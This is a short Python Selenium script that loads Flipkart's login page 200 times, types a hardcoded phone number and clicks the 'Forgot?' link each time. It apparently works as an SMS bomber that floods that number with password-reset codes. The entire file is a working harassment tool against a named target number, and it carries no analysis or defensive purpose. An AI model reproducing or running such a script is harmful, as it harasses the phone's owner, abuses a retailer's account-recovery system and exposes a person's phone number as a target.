from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

options = Options()
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')

browser = webdriver.Chrome(executable_path=r'/root/Documents/miniProject/fun/chromedriver_linux64/chromedriver', chrome_options=options)

frequency = 200

mobile_number = "9536463974"

for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret%20=/')
    number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
    number.click()
    number.send_keys(mobile_number)
    forgot = browser.find_element_by_link_text('Forgot?')
    forgot.click()
    time.sleep(1)
browser.quit()
